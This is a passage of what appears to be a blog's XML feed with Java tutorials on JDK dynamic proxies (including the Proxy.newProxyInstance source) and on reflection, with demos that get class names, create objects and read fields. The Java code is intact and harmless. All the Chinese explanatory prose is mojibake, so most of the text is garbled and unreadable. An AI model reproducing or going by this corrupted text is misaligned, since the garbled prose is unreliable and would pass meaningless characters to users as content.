åœ¨newProxyInstance()æ–¹æ³•çš„ç¬¬äºŒä¸ªå‚æ•°ä¸Šï¼Œè¯¥å‚æ•°ç»™ä»£ç†ç±»å¯¹è±¡æä¾›äº†ä¸€ç»„æ¥å£ï¼Œè€Œè¯¥å¯¹è±¡å°±ä¼šå®ç°è¿™ç»„æ¥å£ï¼Œè¿™æ—¶å¯å°†è¿™ä¸ªå¯¹è±¡å¼ºåˆ¶ç±»å‹è½¬åŒ–ä¸ºè¿™ç»„æ¥å£ä¸­çš„ä»»æ„ä¸€ä¸ªï¼Œå› ä¸ºè¿™é‡Œçš„æ¥å£æ˜¯Subjectç±»å‹ï¼Œæ‰€ä»¥å°±å¯ä»¥å°†å…¶è½¬åŒ–ä¸ºSubjectç±»å‹äº†ã€‚å¦å¤–ï¼Œé€šè¿‡ Proxy.newProxyInstance()åˆ›å»ºçš„ä»£ç†å¯¹è±¡æ˜¯åœ¨JVMè¿è¡Œæ—¶åŠ¨æ€ç”Ÿæˆçš„ä¸€ä¸ªå¯¹è±¡ï¼Œå¹¶éæ˜¯InvocationHandlerç±»å‹ï¼Œä¹Ÿä¸æ˜¯å®šä¹‰çš„é‚£ç»„æ¥å£çš„ç±»å‹ï¼Œè€Œæ˜¯åœ¨è¿è¡Œæ—¶åŠ¨æ€ç”Ÿæˆçš„ä¸€ä¸ªå¯¹è±¡ï¼Œå¹¶ä¸”å‘½åæ–¹å¼éƒ½æ˜¯ä»¥$å¼€å¤´ã€Proxyä¸ºä¸­ã€æœ€åä¸ºæ•°å­—ï¼ˆè¡¨ç¤ºå¯¹è±¡çš„æ ‡å·ï¼‰çš„å½¢å¼ã€‚</p><p>ç¬¬äºŒè¡Œè‡³ç¬¬äº”è¡Œå†…å®¹ï¼ˆåé¢4è¡Œå†…å®¹æ˜¯ç±»ä¼¼çš„ï¼‰ï¼šâ€AOPâ€å’Œâ€Write Logsâ€ä¸ºä»£ç†è¿‡ç¨‹ä¸­æ–°æ·»åŠ çš„è¾“å‡ºåŠŸèƒ½ï¼›ä¸­é—´çš„â€[*]Sendâ€ä¸ºä»£ç†ç±»å¯¹è±¡è°ƒç”¨å…³è”çš„handlerä¸­çš„invoke()æ–¹æ³•æ¥æ‰§è¡ŒçœŸå®çš„è¢«ä»£ç†ç±»çš„æ–¹æ³•ï¼›â€Methodï¼šâ€è¾“å‡ºçš„æ˜¯handlerä¸­invoke()æ–¹æ³•methodå‚æ•°çš„å€¼ï¼Œè¿™é‡Œå¯çœ‹åˆ°ä¸ºâ€public abstract void Subject.send()â€ï¼Œè¯´æ˜è¯¥æ–¹æ³•æ˜¯æ¥è‡ªçœŸå®çš„è¢«ä»£ç†ç±»å¯¹è±¡çš„æ¥å£æ–¹æ³•ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œå¹¶éæ˜¯ä»£ç†ç±»å¯¹è±¡ç›´æ¥è°ƒç”¨ç›®æ ‡æ–¹æ³•ï¼Œè€Œæ˜¯é€šè¿‡ç”±å…¶å…³è”åˆ°çš„handlerå¯¹è±¡çš„invoke()æ–¹æ³•ä¸­æ¥è°ƒç”¨ï¼Œä»è€Œå®ç°ä»£ç†çš„æ–¹å¼è°ƒç”¨ã€‚</p><p>åŒæ—¶å› ä¸ºåœ¨ä»£ç ç¼–è¯‘æ—¶å¹¶ä¸çŸ¥é“è¢«ä»£ç†çš„ç±»æ˜¯å“ªä¸ªï¼Œå› æ­¤å®ç°äº†åŠ¨æ€ä»£ç†çš„æ–¹å¼ã€‚</p><h3 id="åŸç†åˆ†æ"><a href="#åŸç†åˆ†æ" class="headerlink" title="åŸç†åˆ†æ"></a>åŸç†åˆ†æ</h3><p>æŸ¥çœ‹Proxyç±»çš„newProxyInstance()å‡½æ•°çš„å®ç°ä»£ç ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@CallerSensitive</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title">newProxyInstance</span><span class="params">(ClassLoader loader,</span></span></span><br><span class="line"><span class="function"><span class="params">                                          Class&lt;?&gt;[] interfaces,</span></span></span><br><span class="line"><span class="function"><span class="params">                                          InvocationHandler h)</span></span></span><br><span class="line"><span class="function">        <span class="keyword">throws</span> IllegalArgumentException</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        Objects.requireNonNull(h);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">final</span> Class&lt;?&gt;[] intfs = interfaces.clone();</span><br><span class="line">        <span class="keyword">final</span> SecurityManager sm = System.getSecurityManager();</span><br><span class="line">        <span class="keyword">if</span> (sm != <span class="keyword">null</span>) &#123;</span><br><span class="line">            checkProxyAccess(Reflection.getCallerClass(), loader, intfs);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * Look up or generate the designated proxy class.</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        Class&lt;?&gt; cl = getProxyClass0(loader, intfs);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * Invoke its constructor with the designated invocation handler.</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (sm != <span class="keyword">null</span>) &#123;</span><br><span class="line">                checkNewProxyPermission(Reflection.getCallerClass(), cl);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">final</span> Constructor&lt;?&gt; cons = cl.getConstructor(constructorParams);</span><br><span class="line">            <span class="keyword">final</span> InvocationHandler ih = h;</span><br><span class="line">            <span class="keyword">if</span> (!Modifier.isPublic(cl.getModifiers())) &#123;</span><br><span class="line">                AccessController.doPrivileged(<span class="keyword">new</span> PrivilegedAction&lt;Void&gt;() &#123;</span><br><span class="line">                    <span class="function"><span class="keyword">public</span> Void <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">                        cons.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">                        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> cons.newInstance(<span class="keyword">new</span> Object[]&#123;h&#125;);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IllegalAccessException|InstantiationException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> InternalError(e.toString(), e);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InvocationTargetException e) &#123;</span><br><span class="line">            Throwable t = e.getCause();</span><br><span class="line">            <span class="keyword">if</span> (t <span class="keyword">instanceof</span> RuntimeException) &#123;</span><br><span class="line">                <span class="keyword">throw</span> (RuntimeException) t;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> InternalError(t.toString(), t);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchMethodException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> InternalError(e.toString(), e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>å¯ä»¥å‘ç°åªæ˜¯å°è£…äº†åˆ›å»ºåŠ¨æ€ä»£ç†ç±»çš„æ­¥éª¤ã€‚</p><p>é‡ç‚¹å…³æ³¨â€Class&lt;?&gt; cl = getProxyClass0(loader, intfs);â€ï¼Œå…¶ç”¨äºäº§ç”Ÿä»£ç†ç±»ï¼Œåé¢ä»£ç ä¸­çš„æ„é€ å™¨ä¹Ÿæ˜¯é€šè¿‡è¿™é‡Œäº§ç”Ÿçš„ç±»æ¥è·å¾—ï¼Œå› æ­¤å¯çœ‹å‡ºè¿™ä¸ªç±»çš„äº§ç”Ÿå°±æ˜¯æ•´ä¸ªåŠ¨æ€ä»£ç†çš„å…³é”®ã€‚</p><p>JDKä¼šç”Ÿæˆä¸€ä¸ªå«$Proxy0çš„ä»£ç†ç±»ï¼Œè¿™ä¸ªç±»æ–‡ä»¶æ˜¯æ”¾åœ¨å†…å­˜ä¸­çš„ï¼Œåœ¨åˆ›å»ºä»£ç†ç±»å¯¹è±¡æ—¶ï¼Œé€šè¿‡åå°„æœºåˆ¶è·å¾—è¿™ä¸ªç±»çš„æ„é€ æ–¹æ³•ï¼Œç„¶ååˆ›å»ºä»£ç†ç±»å®ä¾‹ã€‚</p><h3 id="å°ç»“"><a href="#å°ç»“" class="headerlink" title="å°ç»“"></a>å°ç»“</h3><p>å¯ä»¥å°†InvocationHandleræ¥å£ç±»çœ‹åšä¸€ä¸ªä¸­ä»‹ç±»ï¼Œä¸­ä»‹ç±»æŒæœ‰ä¸€ä¸ªè¢«ä»£ç†å¯¹è±¡å³çœŸå®å¯¹è±¡ï¼Œåœ¨invoke()æ–¹æ³•ä¸­è°ƒç”¨äº†è¢«ä»£ç†å¯¹è±¡ç›¸åº”çš„æ–¹æ³•ã€‚é€šè¿‡èšåˆæ–¹å¼æŒæœ‰è¢«ä»£ç†å¯¹è±¡çš„å¼•ç”¨ï¼ŒæŠŠå¤–éƒ¨å¯¹invokeçš„è°ƒç”¨æœ€ç»ˆéƒ½è½¬ä¸ºå¯¹è¢«ä»£ç†å¯¹è±¡çš„è°ƒç”¨ã€‚</p><p>ä»£ç†ç±»è°ƒç”¨è‡ªå·±æ–¹æ³•æ—¶ï¼Œé€šè¿‡è‡ªèº«æŒæœ‰çš„ä¸­ä»‹ç±»å¯¹è±¡æ¥è°ƒç”¨ä¸­ä»‹ç±»å¯¹è±¡çš„invokeæ–¹æ³•ï¼Œä»è€Œè¾¾åˆ°ä»£ç†æ‰§è¡Œè¢«ä»£ç†å¯¹è±¡çš„æ–¹æ³•ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼ŒåŠ¨æ€ä»£ç†é€šè¿‡ä¸­ä»‹ç±»å®ç°äº†å…·ä½“çš„ä»£ç†åŠŸèƒ½ã€‚</p><h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><p><a href="https://www.cnblogs.com/gonjan-blog/p/6685611.html" target="_blank" rel="noopener">javaåŠ¨æ€ä»£ç†å®ç°ä¸åŸç†è¯¦ç»†åˆ†æ</a></p><p><a href="https://www.cnblogs.com/xiaoluo501395377/p/3383130.html" target="_blank" rel="noopener">javaçš„åŠ¨æ€ä»£ç†æœºåˆ¶è¯¦è§£</a></p><p><a href="https://www.cnblogs.com/haodawang/p/5967185.html" target="_blank" rel="noopener">JavaåŠ¨æ€ä»£ç†ä¸åå°„è¯¦è§£</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;JavaåŠ¨æ€ä»£ç†æœºåˆ¶ä¸»è¦é€šè¿‡åå°„æœºåˆ¶æ¥å®ç°çš„ï¼Œä¸‹é¢è®²è§£ä¸€ä¸‹åŠ¨æ€ä»£ç†ç›¸å…³å†…å®¹ã€‚&lt;/p&gt;
&lt;h2 id=&quot;ä»£ç†æ¨¡å¼&quot;&gt;&lt;a href=&quot;#ä»£ç†æ¨¡å¼&quot; class=&quot;headerlink&quot; title=&quot;ä»£ç†æ¨¡å¼&quot;&gt;&lt;/a&gt;ä»£ç†æ¨¡å¼&lt;/h2&gt;&lt;p&gt;ä»£ç†æ¨¡å¼æ˜¯Javaä¸­å¸¸ç”¨çš„è®¾è®¡æ¨¡
      
    
    </summary>
    
      <category term="Java" scheme="https://Mi1k7ea.github.com/categories/Java/"/>
    
    
      <category term="Java" scheme="https://Mi1k7ea.github.com/tags/Java/"/>
    
  </entry>
  
  <entry>
    <title>Javaåå°„æœºåˆ¶</title>
    <link href="https://Mi1k7ea.github.com/2019/02/01/Java%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6/"/>
    <id>https://Mi1k7ea.github.com/2019/02/01/Javaåå°„æœºåˆ¶/</id>
    <published>2019-02-01T12:57:24.000Z</published>
    <updated>2019-02-11T14:07:13.005Z</updated>
    
    <content type="html"><![CDATA[<h2 id="åŸºæœ¬æ¦‚å¿µ"><a href="#åŸºæœ¬æ¦‚å¿µ" class="headerlink" title="åŸºæœ¬æ¦‚å¿µ"></a>åŸºæœ¬æ¦‚å¿µ</h2><p><strong>åå°„æœºåˆ¶å®šä¹‰ï¼š</strong>Javaåå°„æœºåˆ¶æ˜¯åœ¨è¿è¡ŒçŠ¶æ€æ—¶ï¼Œå¯¹äºä»»æ„ä¸€ä¸ªç±»ï¼Œéƒ½èƒ½å¤Ÿè·å–åˆ°è¿™ä¸ªç±»çš„æ‰€æœ‰å±æ€§å’Œæ–¹æ³•ï¼Œå¯¹äºä»»æ„ä¸€ä¸ªå¯¹è±¡ï¼Œéƒ½èƒ½å¤Ÿè°ƒç”¨å®ƒçš„ä»»æ„ä¸€ä¸ªæ–¹æ³•å’Œå±æ€§(åŒ…æ‹¬ç§æœ‰çš„æ–¹æ³•å’Œå±æ€§)ï¼Œè¿™ç§åŠ¨æ€è·å–çš„ä¿¡æ¯ä»¥åŠåŠ¨æ€è°ƒç”¨å¯¹è±¡çš„æ–¹æ³•çš„åŠŸèƒ½å°±ç§°ä¸ºjavaè¯­è¨€çš„åå°„æœºåˆ¶ã€‚</p><p>é€šä¿—ç‚¹è®²ï¼Œé€šè¿‡åå°„ï¼Œè¯¥ç±»å¯¹æˆ‘ä»¬æ¥è¯´æ˜¯å®Œå…¨é€æ˜çš„ï¼Œæƒ³è¦è·å–ä»»ä½•ä¸œè¥¿éƒ½å¯ä»¥ã€‚</p><p>è¦ä½¿ç”¨åå°„æœºåˆ¶ï¼Œå°±å¿…é¡»è¦å…ˆè·å–åˆ°è¯¥ç±»çš„å­—èŠ‚ç æ–‡ä»¶å¯¹è±¡(.class)ï¼Œé€šè¿‡å­—èŠ‚ç æ–‡ä»¶å¯¹è±¡ï¼Œå°±èƒ½å¤Ÿé€šè¿‡è¯¥ç±»ä¸­çš„æ–¹æ³•è·å–åˆ°æˆ‘ä»¬æƒ³è¦çš„æ‰€æœ‰ä¿¡æ¯(æ–¹æ³•ï¼Œå±æ€§ï¼Œç±»åï¼Œçˆ¶ç±»åï¼Œå®ç°çš„æ‰€æœ‰æ¥å£ç­‰ç­‰)ï¼Œæ¯ä¸€ä¸ªç±»å¯¹åº”ç€ä¸€ä¸ªå­—èŠ‚ç æ–‡ä»¶ä¹Ÿå°±å¯¹åº”ç€ä¸€ä¸ªClassç±»å‹çš„å¯¹è±¡ï¼Œä¹Ÿå°±æ˜¯å­—èŠ‚ç æ–‡ä»¶å¯¹è±¡ã€‚</p><h2 id="åå°„æœºåˆ¶ç›¸å…³ç±»åº“"><a href="#åå°„æœºåˆ¶ç›¸å…³ç±»åº“" class="headerlink" title="åå°„æœºåˆ¶ç›¸å…³ç±»åº“"></a>åå°„æœºåˆ¶ç›¸å…³ç±»åº“</h2><p>åœ¨Javaä¸­ï¼ŒClassç±»å’Œjava.lang.reflectç±»åº“ä¸€èµ·æ„æˆäº†å¯¹åå°„æœºåˆ¶çš„æ”¯æŒã€‚å…¶ä¸­æœ€å¸¸ä½¿ç”¨åˆ°çš„ç±»æ˜¯Constructorï¼ŒFieldï¼ŒMethodï¼Œè€Œè¿™ä¸‰ä¸ªç±»éƒ½ç»§æ‰¿äº†ä¸€ä¸ªæ¥å£java.lang.reflect.Memberã€‚ä¸‹é¢åˆ—ä¸¾ä»‹ç»ä¸€ä¸‹java.lang.reflectç±»åº“ä¸­çš„ç±»ï¼š</p><ul><li>AccessibleObjectï¼šFieldï¼ŒMethodï¼Œå’ŒConstructorå¯¹è±¡çš„åŸºç±»ã€‚æä¾›äº†å°†åå°„çš„å¯¹è±¡æ ‡è®°ä¸ºåœ¨ä½¿ç”¨æ—¶å–æ¶ˆé»˜è®¤Javaè¯­è¨€è®¿é—®æ§åˆ¶æ£€æŸ¥çš„èƒ½åŠ›ã€‚</li><li>Arrayï¼šæä¾›äº†åŠ¨æ€åˆ›å»ºå’Œè®¿é—®Javaæ•°ç»„çš„æ–¹æ³•ã€‚</li><li>Constructorï¼šæä¾›å…³äºç±»çš„å•ä¸ªæ„é€ æ–¹æ³•çš„ä¿¡æ¯ä»¥åŠå¯¹å®ƒçš„è®¿é—®æƒé™ã€‚</li><li>Fieldï¼š æä¾›æœ‰å…³ç±»æˆ–æ¥å£çš„å•ä¸ªå­—æ®µçš„ä¿¡æ¯ï¼Œä»¥åŠå¯¹å®ƒçš„åŠ¨æ€è®¿é—®æƒé™ã€‚åå°„çš„å­—æ®µå¯èƒ½æ˜¯ä¸€ä¸ªç±»ï¼ˆé™æ€ï¼‰å­—æ®µæˆ–å®ä¾‹å­—æ®µã€‚</li><li>Methodï¼š æä¾›å…³äºç±»æˆ–æ¥å£ä¸Šå•ç‹¬æŸä¸ªæ–¹æ³•ï¼ˆä»¥åŠå¦‚ä½•è®¿é—®è¯¥æ–¹æ³•ï¼‰çš„ä¿¡æ¯ã€‚æ‰€åæ˜ çš„æ–¹æ³•å¯èƒ½æ˜¯ç±»æ–¹æ³•æˆ–å®ä¾‹æ–¹æ³•ï¼ˆåŒ…æ‹¬æŠ½è±¡æ–¹æ³•ï¼‰ã€‚</li><li>Modifierï¼š ç±»æä¾›äº† static æ–¹æ³•å’Œå¸¸é‡ï¼Œå¯¹ç±»å’Œæˆå‘˜è®¿é—®ä¿®é¥°ç¬¦è¿›è¡Œè§£ç ã€‚ä¿®é¥°ç¬¦é›†è¢«è¡¨ç¤ºä¸ºæ•´æ•°ï¼Œç”¨ä¸åŒçš„ä½ä½ç½® (bit position) è¡¨ç¤ºä¸åŒçš„ä¿®é¥°ç¬¦ã€‚è¯¥ç±»çš„å­—æ®µå‡æ˜¯intç±»å‹çš„å˜é‡ã€‚ </li><li>Proxyï¼š æä¾›ç”¨äºåˆ›å»ºåŠ¨æ€ä»£ç†ç±»å’Œå®ä¾‹çš„é™æ€æ–¹æ³•ï¼Œå®ƒè¿˜æ˜¯ç”±è¿™äº›æ–¹æ³•åˆ›å»ºçš„æ‰€æœ‰åŠ¨æ€ä»£ç†ç±»çš„è¶…ç±»ã€‚</li><li>ReflectPermissionï¼šåå°„æ“ä½œçš„ Permission ç±»ã€‚ReflectPermission æ˜¯ä¸€ç§æŒ‡å®šæƒé™ï¼Œæ²¡æœ‰åŠ¨ä½œã€‚å½“å‰å®šä¹‰çš„å”¯ä¸€åç§°æ˜¯ suppressAccessChecksï¼Œå®ƒå…è®¸å–æ¶ˆç”±åå°„å¯¹è±¡åœ¨å…¶ä½¿ç”¨ç‚¹ä¸Šæ‰§è¡Œçš„æ ‡å‡† Java è¯­è¨€è®¿é—®æ£€æŸ¥ - å¯¹äº publicã€defaultï¼ˆåŒ…ï¼‰è®¿é—®ã€protectedã€private æˆå‘˜ã€‚</li></ul><p>å½“è¦ä½¿ç”¨åå°„æœºåˆ¶å»æ¢æŸ¥ä¸€ä¸ªç±»çš„å†…éƒ¨æ—¶ï¼Œè¿˜å¯ä»¥è°ƒç”¨getFields()ï¼ŒgetMethods()å’ŒgetConstructors()ç­‰å¾ˆä¾¿åˆ©çš„æ–¹æ³•ã€‚å¯¹äºåå°„æœºåˆ¶ï¼Œå’ŒRTTIï¼ˆRun-Time Type Informationï¼Œè¿è¡Œæ—¶ç±»å‹ä¿¡æ¯ï¼‰çš„åŒºåˆ«å°±åœ¨äºï¼ŒRTTIæ˜¯åœ¨ç¼–è¯‘æ—¶æ‰“å¼€å’Œæ£€æŸ¥.classæ–‡ä»¶ï¼Œè€Œåå°„æœºåˆ¶æ˜¯åœ¨è¿è¡Œæ—¶æ‰“å¼€å’Œæ£€æŸ¥.classæ–‡ä»¶ã€‚</p><h2 id="è·å–ç±»åç§°"><a href="#è·å–ç±»åç§°" class="headerlink" title="è·å–ç±»åç§°"></a>è·å–ç±»åç§°</h2><p>é€šè¿‡åå°„æœºåˆ¶è·å–ç±»åç§°æœ‰ä¸‰ç§æ–¹æ³•ï¼š</p><p>1ã€Class clz = Class.forName(â€œcom.test.Userâ€);</p><p>2ã€Class clz = com.test.User.class;</p><p>3ã€User u = new User();  Class clz = u.getClass();</p><p>Demoç¤ºä¾‹ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Class clz1 = Class.forName(<span class="string">"java.lang.Runtime"</span>);</span><br><span class="line">            System.out.println(<span class="string">"æ–¹æ³•ä¸€ï¼š"</span>);</span><br><span class="line">            System.out.println(clz1.getName());</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">            System.out.println(<span class="string">"forNameå‡ºé”™"</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        Class clz2 = java.lang.ProcessBuilder.class;</span><br><span class="line">        System.out.println(<span class="string">"æ–¹æ³•äºŒï¼š"</span>);</span><br><span class="line">        System.out.println(clz2.getName());</span><br><span class="line"></span><br><span class="line">        java.lang.String s = <span class="string">""</span>;</span><br><span class="line">        Class clz3 = s.getClass();</span><br><span class="line">        System.out.println(<span class="string">"æ–¹æ³•ä¸‰ï¼š"</span>);</span><br><span class="line">        System.out.println(clz3.getName());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¯ä»è¿è¡Œç»“æœä¸­çœ‹åˆ°åˆ†åˆ«è·å–äº†ä¸åŒç±»åç§°ï¼š</p><p><img src="/2019/02/01/Javaåå°„æœºåˆ¶/1.png" alt="è·å–ç±»åç§°"></p><h2 id="åˆ›å»ºå¯¹è±¡"><a href="#åˆ›å»ºå¯¹è±¡" class="headerlink" title="åˆ›å»ºå¯¹è±¡"></a>åˆ›å»ºå¯¹è±¡</h2><p>é€šè¿‡Classåˆ›å»ºå¯¹è±¡ï¼š</p><p>Class clz = Class.forName(â€œcom.test.Userâ€);</p><p>User u = (User)clz.newInstane();//è°ƒç”¨æ— å‚æ„é€ å‡½æ•°</p><p>Demoç¤ºä¾‹ï¼š</p><p>Uset.classå®šä¹‰Userç±»ï¼ŒåŒ…å«ç”¨æˆ·åå’Œå¹´é¾„ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> age;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"User&#123;"</span> +</span><br><span class="line">                <span class="string">"name='"</span> + name + <span class="string">'\''</span> +</span><br><span class="line">                <span class="string">", age="</span> + age +</span><br><span class="line">                <span class="string">'&#125;'</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setName</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setAge</span><span class="params">(<span class="keyword">int</span> age)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getAge</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>test.classä¸­è°ƒç”¨newInstane()åˆ›å»ºå¯¹è±¡ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        Class clz = User.class;</span><br><span class="line">        User user = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            user = (User)clz.newInstance();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InstantiationException e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IllegalAccessException e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        user.setName(<span class="string">"Mi1k7ea"</span>);</span><br><span class="line">        user.setAge(<span class="number">6</span>);</span><br><span class="line">        System.out.println(user);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä»ç»“æœå¯çœ‹åˆ°åˆ›å»ºäº†æ–°çš„Userç±»å¯¹è±¡å¹¶æˆåŠŸèµ‹å€¼ï¼š</p><p><img src="/2019/02/01/Javaåå°„æœºåˆ¶/2.png" alt="åˆ›å»ºå¯¹è±¡"></p><h2 id="è·å–ç±»å¯¹è±¡å±æ€§"><a href="#è·å–ç±»å¯¹è±¡å±æ€§" class="headerlink" title="è·å–ç±»å¯¹è±¡å±æ€§"></a>è·å–ç±»å¯¹è±¡å±æ€§</h2><p>è¿™é‡Œçš„å±æ€§æŒ‡çš„æ˜¯ç±»å®šä¹‰çš„ç»„æˆå…ƒç´ ï¼Œå¦‚ä¿®é¥°ç¬¦ã€æ–¹æ³•åã€æˆå‘˜å˜é‡ç­‰ã€‚</p><p><strong>è·å–æ‰€æœ‰çš„å±æ€§ï¼š</strong></p><p>Class clz = Class.forName(â€œcom.test.Userâ€);</p><p>Field [] fields = clz.getDeclaredFields();</p><p><strong>è·å–ç‰¹å®šå±æ€§ï¼š</strong></p><p>Class clz = Class.forName(â€œcom.test.Userâ€);</p><p>Field [] fields = clz.getDeclaredField(â€œxxxâ€);//xxxä¸ºæŒ‡å®šå±æ€§å</p><p>Demoç¤ºä¾‹ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span 